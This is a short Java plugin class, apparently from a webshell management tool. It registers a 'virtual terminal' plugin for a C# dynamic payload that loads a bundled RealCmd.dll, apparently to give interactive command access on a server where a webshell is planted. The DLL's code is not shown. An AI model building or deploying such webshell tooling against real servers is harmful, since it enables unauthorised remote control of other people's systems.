package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.RealCmd;
import util.functions;

@PluginAnnotation(
   payloadName = "CShapDynamicPayload",
   Name = "RealCmd",
   DisplayName = "虚拟终端"
)
public class CRealCmd extends RealCmd {
   private static final String CLASS_NAME = "RealCmd.Run";

   public byte[] readPlugin() {
      return functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("assets/RealCmd.dll"));
   }

   public String getClassName() {
      return "RealCmd.Run";
   }
}
